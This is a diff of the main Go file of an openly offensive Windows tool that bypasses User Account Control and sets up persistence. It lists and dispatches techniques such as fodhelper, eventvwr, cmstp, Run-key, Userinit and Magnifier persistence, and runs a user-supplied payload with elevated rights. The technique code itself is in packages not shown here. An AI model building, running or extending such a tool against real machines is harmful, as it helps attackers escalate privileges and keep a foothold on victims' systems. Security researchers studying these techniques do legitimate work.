@@ -1,187 +1,183 @@
+// Copyright (c) 2022 0x9ef. All rights reserved.
+// Use of this source code is governed by an MIT license
+// that can be found in the LICENSE file.
 package main
 
 import (
-	"flag"
 	"fmt"
 	"log"
 	"os"
+	"path/filepath"
+	"strings"
+	"time"
+	. "uacbypass/pkg"
+	once "uacbypass/pkg/once"
+	"uacbypass/pkg/persist"
 
-	once "./src/once"
-	pers "./src/persistence"
-
-	tablewriter "github.com/0x9ef/tablewriter"
+	flags "github.com/jessevdk/go-flags"
+	tablewriter "github.com/olekukonko/tablewriter"
 )
 
-func logotype() string {
-	var pLogo string = `
-    _____  __  __  ___   _____   ___                                            
-   / ___/ / / / / / _ | / ___/  | _ )  _  _   _ __   __ _   ___  ___  ___   _ _ 
-  / (_ / / /_/ / / __ |/ /__    | _ \ | || | | '_ \ / _  | (_-< (_-< / -_) | '_|
-  \___/  \____/ /_/ |_|\___/    |___/  \_, | | .__/ \__,_| /__/ /__/ \___| |_|
-    For researchers only               |__/  |_|           by 0x9ef`
-	return pLogo
+var Options struct {
+	Path      string `long:"path" description:"Path to payload"`
+	Technique string `short:"t" long:"technique" description:"Executing technique of UAC bypassing"`
+	Once      bool   `short:"o" long:"once" description:"Execute once elevation"`
+	Persist   bool   `short:"p" long:"persist" description:"Execute persistent elevation"`
+	Cleanup   bool   `short:"c" long:"cleanup" description:"Cleanup all files and registry keys used during elevation"`
+	List      bool   `short:"l" long:"list" description:"Show list of all currently implemented techniques"`
 }
 
 func main() {
-	payload := flag.String("payload", "C:\\Payloads\\payload.exe", "Provide path for payload executing")
-	method := flag.String("method", "fodhelper", "Provide method of UAC bypass")
-	list := flag.Bool("list", false, "Provide to get list of all currently techniques implemented")
-	flag.Parse()
+	print(`
+     ██████╗ ██╗   ██╗ █████╗  ██████╗██████╗ ██████╗ 
+    ██╔════╝ ██║   ██║██╔══██╗██╔════╝██╔══██╗██╔══██╗
+    ██║  ███╗██║   ██║███████║██║     ██████╔╝██████╔╝
+    ██║   ██║██║   ██║██╔══██║██║     ██╔══██╗██╔═══╝ 
+    ╚██████╔╝╚██████╔╝██║  ██║╚██████╗██████╔╝██║     
+     ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═════╝ ╚═╝     
+      by 0x9ef, for researches purposes ONLY! 
+      version 2.1.0
+` + "\n")
 
-	if *list {
-		fmt.Println(logotype() + "\n\r\n\r")
-		names := []string{
-			"COMPUTERDEFAULTS",
-			"EVENTVWR",
-			"FODHELPER",
-			"SDCLTCONTROL",
-			"SILENTCLEANUP",
-			"SLUI",
-			"HKCU",
-			"HKLM",
-			"IFEO",
-			"SCHTASKS",
-			"USERINIT",
-			"WMIC",
-		}
-		types := []string{
-			"Once",
-			"Once",
-			"Once",
-			"Once",
-			"Once",
-			"Once",
-			"Persistence",
-			"Persistence",
-			"Persistence",
-			"Persistence",
-			"Persistence",
-			"Persistence",
-		}
-		fixed := []string{
-			"false",
-			"false",
-			"false",
-			"true",
-			"false",
-			"true",
-			"false",
-			"false",
-			"false",
-			"false",
-			"false",
-			"false",
-		}
-		descs := []string{
-			"Bypass UAC Once using computerdefaults and registry key manipulation",
-			"Bypass UAC Once using eventvwr and registry key manipulation",
-			"Bypass UAC Once using fodhelper and registry key manipulation",
-			"Bypass UAC Once using sdclt (app paths) and registry key manipulation",
-			"Bypass UAC Once using silentcleanup and registry key manipulation",
-			"Bypass UAC Once using slui and registry key manipulation",
-			"Gain persistence using HKEY_CURRENT_USER Run registry key",
-			"Gain persistence using HKEY_LOCAL_MACHINE Run registry key",
-			"Gain persistence using IFEO debugger registry key",
-			"Gain persistence with system privilege using schtasks",
-			"Gain persistence using Userinit registry key",
-			"Gain persistence with system privilege using wmic",
-		}
-		data := [][]string{
-			[]string{names[6], types[6], fixed[6], descs[6]},
-			[]string{names[7], types[7], fixed[7], descs[7]},
-			[]string{names[8], types[8], fixed[8], descs[8]},
-			[]string{names[9], types[9], fixed[9], descs[9]},
-			[]string{names[10], types[10], fixed[10], descs[10]},
-			[]string{names[11], types[11], fixed[11], descs[11]},
-			[]string{names[0], types[0], fixed[0], descs[0]},
-			[]string{names[1], types[1], fixed[1], descs[1]},
-			[]string{names[2], types[2], fixed[2], descs[2]},
-			[]string{names[3], types[3], fixed[3], descs[3]},
-			[]string{names[4], types[4], fixed[4], descs[4]},
-			[]string{names[5], types[5], fixed[5], descs[5]},
-		}
+	fmt.Printf("General information:\n")
+	fmt.Printf("  UAC Level: %d\n", GetUACLevel())
+	fmt.Printf("  Build number: %d\n", GetBuildNumber())
+	fmt.Printf("  Status: OK\n\n")
 
-		table := tablewriter.NewWriter(os.Stdout)
-		table.SetRowWidth(120)
-		table.SetHeader([]string{"Name", "Type", "Fixed", "Description"})
-		table.SetBorders(tablewriter.Border{Left: true, Top: false, Right: true, Bottom: false})
-		table.SetCenterSeparator("|")
-		table.AppendBulk(data)
-		table.Render()
+	// parse flags
+	if _, err := flags.NewParser(&Options, flags.HelpFlag|flags.PassDoubleDash).Parse(); err != nil {
+		panic(err)
+	}
 
-		return
+	type onceKv struct {
+		info Info
+		f    OnceExecutor
+	}
+
+	type persistKv struct {
+		info Info
+		f    PersistExecutor
+	}
+
+	// Once implemented techniques list
+	var tableOnce []onceKv
+	tableOnce = append(tableOnce, onceKv{InfoOnceCmstp, once.ExecCmstp})
+	tableOnce = append(tableOnce, onceKv{InfoOnceComputerdefaults, once.ExecComputerdefaults})
+	tableOnce = append(tableOnce, onceKv{InfoOnceEventvwr, once.ExecEventvwr})
+	tableOnce = append(tableOnce, onceKv{InfoOnceFodhelper, once.ExecFodhelper})
+	tableOnce = append(tableOnce, onceKv{InfoOnceSdcltcontrol, once.ExecSdcltcontrol})
+	tableOnce = append(tableOnce, onceKv{InfoOnceSilentcleanup, once.ExecSilentcleanup})
+	tableOnce = append(tableOnce, onceKv{InfoOnceSlui, once.ExecSlui})
+	tableOnce = append(tableOnce, onceKv{InfoOnceWsreset, once.ExecWsreset})
+
+	// Persist implemented techniques list
+	var tablePersist []persistKv
+	tablePersist = append(tablePersist, persistKv{InfoPersistCortana, persist.ExecutorCortana{}})
+	tablePersist = append(tablePersist, persistKv{InfoPersistHkcu, persist.ExecutorHkcu{}})
+	tablePersist = append(tablePersist, persistKv{InfoPersistHklm, persist.ExecutorHklm{}})
+	tablePersist = append(tablePersist, persistKv{InfoPersistMagnifier, persist.ExecutorMagnifier{}})
+	tablePersist = append(tablePersist, persistKv{InfoPersistPeople, persist.ExecutorPeople{}})
+	tablePersist = append(tablePersist, persistKv{InfoPersistStartup, persist.ExecutorStartup{}})
+	tablePersist = append(tablePersist, persistKv{InfoPersistUserinit, persist.ExecutorUserinit{}})
+
+	if Options.List {
+		draw := tablewriter.NewWriter(os.Stdout)
+		draw.SetHeader([]string{"Id", "Type", "Name", "Description", "Fixed", "Admin"})
+		draw.SetBorders(tablewriter.Border{Left: false, Top: false, Right: false, Bottom: false})
+		draw.SetColWidth(48)
+		fmt.Printf("Table information:\n")
+		for i := range tableOnce {
+			t := tableOnce[i]
+			row := []string{fmt.Sprintf("%d", t.info.Id), "Once", t.info.Name, t.info.Description, "Unknown", "Unknown"}
+			draw.Append(row)
+		}
+		for i := range tablePersist {
+			t := tablePersist[i]
+			row := []string{fmt.Sprintf("%d", t.info.Id), "Persist", t.info.Name, t.info.Description, "Unknown", "Unknown"}
+			draw.Append(row)
+		}
+		draw.Render()
+		fmt.Println()
+	}
+
+	flagPath := Options.Path
+	absPath, err := filepath.Abs(flagPath)
+	if err != nil {
+		panic(err)
+	}
+	s, err := os.Stat(absPath) // check for path exists
+	if err != nil {
+		panic(err)
 	} else {
-		if len(os.Args) != 5 {
-			log.Println("[ERR] Invalid arguments length")
-			flag.PrintDefaults()
-			os.Exit(1)
-		}
-
-		if payload == nil || *payload == "" {
-			log.Println("[ERR] Payload -payload argument mismatching")
-			flag.PrintDefaults()
-			os.Exit(1)
-		}
-
-		if method == nil || *method == "" {
-			log.Println("[ERR] Method -method argument mismatching")
-			flag.PrintDefaults()
-			os.Exit(1)
-		}
-
-		p := *payload
-		switch *method {
-		// Once
-		case "computerdefaults", "COMPUTERDEFAULTS", "0":
-			if err, _ := once.NewOnceComputerDefaults(p); err != nil {
-				log.Println("[ERR]:", err)
-			}
-		case "eventvwr", "EVENTVWR", "1":
-			if err, _ := once.NewOnceEventvwr(p); err != nil {
-				log.Println("[ERR]:", err)
-			}
-		case "fodhelper", "FODHELPER", "2":
-			if err, _ := once.NewOnceFodHelper(p); err != nil {
-				log.Println("[ERR]:", err)
-			}
-		case "sdcltcontrol", "SDCLTCONTROL", "3":
-			if err, _ := once.NewOnceSdcltControl(p); err != nil {
-				log.Println("[ERR]:", err)
-			}
-		case "silentcleanup", "SILENTCLEANUP", "4":
-			if err, _ := once.NewOnceSilentCleanup(p); err != nil {
-				log.Println("[ERR]:", err)
-			}
-		case "slui", "SLUI", "5":
-			if err, _ := once.NewOnceSlui(p); err != nil {
-				log.Println("[ERR]:", err)
-			}
-
-		// Persistence
-		case "hkcu", "HKCU", "6":
-			if err, _ := pers.NewPersistenceHKCU(p); err != nil {
-				log.Println("[ERR]:", err)
-			}
-		case "hklm", "HKLM", "7":
-			if err, _ := pers.NewPersistenceHKLM(p); err != nil {
-				log.Println("[ERR]:", err)
-			}
-		case "ifeo", "IFEO", "8":
-			if err, _ := pers.NewPersistenceIFEO(p); err != nil {
-				log.Println("[ERR]:", err)
-			}
-		case "schtasks", "SCHTASKS", "9":
-			if err, _ := pers.NewPersistenceSCHTASKS(p); err != nil {
-				log.Println("[ERR]:", err)
-			}
-		case "userinit", "USERINIT", "10":
-			if err, _ := pers.NewPersistenceUSERINIT(p); err != nil {
-				log.Println("[ERR]:", err)
-			}
-		case "wmic", "WMIC", "11":
-			if err, _ := pers.NewPersistenceWMIC(p); err != nil {
-				log.Println("[ERR]:", err)
-			}
+		if s.IsDir() {
+			panic("cannot setup folder as executable payload")
 		}
 	}
+
+	flagTechnique := Options.Technique
+	if len(flagTechnique) == 0 {
+		flagTechnique = "fodhelper"
+	}
+
+	var ptype string
+	ext := filepath.Ext(flagPath)
+	switch ext {
+	case ".exe":
+		ptype = "Executable"
+	case ".dll":
+		ptype = "DLL"
+	case ".png", ".jpg", ".jpeg", ".bmp", ".gif":
+		ptype = "Image"
+	default:
+		ptype = "Undefined"
+	}
+
+	fmt.Printf("Selected [%s] %s payload\n", ptype, absPath)
+	fmt.Printf("Selected 'win32/%s' bypass technique, trying to elevate...\n", flagTechnique)
+	time.Sleep(2 * time.Second)
+	log.Printf("Technique started!\n")
+	var timeStart time.Time
+	var timeEnd time.Time
+	if Options.Once {
+		var f OnceExecutor
+		for i := range tableOnce {
+			value := tableOnce[i]
+			if strings.Contains(value.info.Name, flagTechnique) {
+				f = value.f
+				break
+			}
+		}
+		timeStart = time.Now()
+		err = f(absPath)
+		if err != nil {
+			log.Printf("ERR! Cannot elevate, because... %s\n", err.Error())
+			return
+		}
+		timeEnd = time.Now()
+	} else if Options.Persist {
+		var f PersistExecutor
+		for i := range tablePersist {
+			value := tablePersist[i]
+			if strings.Contains(value.info.Name, flagTechnique) {
+				f = value.f
+				break
+			}
+		}
+
+		// Cleanup if setuped
+		if Options.Cleanup {
+			defer f.Revert()
+		}
+		timeStart = time.Now()
+		err = f.Exec(absPath)
+		if err != nil {
+			log.Printf("ERR! Cannot elevate, because... %s\n", err.Error())
+			return
+		}
+		timeEnd = time.Now()
+	} else {
+		panic("please select options of executable method once/persist by --once or --persist flags. Type --help for more information")
+	}
+	log.Printf("Succesfully completed.\n")
+	fmt.Printf("Time tooked: %.2fsecs\n", timeEnd.Sub(timeStart).Seconds())
 }
